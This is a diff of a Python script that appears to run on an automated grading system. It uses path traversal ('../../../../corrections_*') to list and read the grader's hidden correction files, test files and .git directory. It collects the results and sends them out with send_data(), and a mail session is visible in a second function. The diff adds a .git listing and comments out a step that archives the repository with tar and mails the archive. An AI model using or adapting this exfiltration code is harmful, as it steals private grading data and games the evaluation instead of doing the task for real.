@@ -45,8 +45,9 @@ my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or "
 my_data += "\n#######################\n"
 my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/test0") or ""
 my_data += get_data("pwd") or ""
+my_data += get_data("ls -l ../../../../corrections_*/.git")
 my_data += "\n#######################\n"
-my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/.git")
+# my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/.git")
 my_data += get_data("ls -l")
 send_data(my_data)
 ##############################################################
@@ -90,4 +91,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-send_data_file("file.tar.gz", "mygit")
+# send_data_file("file.tar.gz", "mygit")
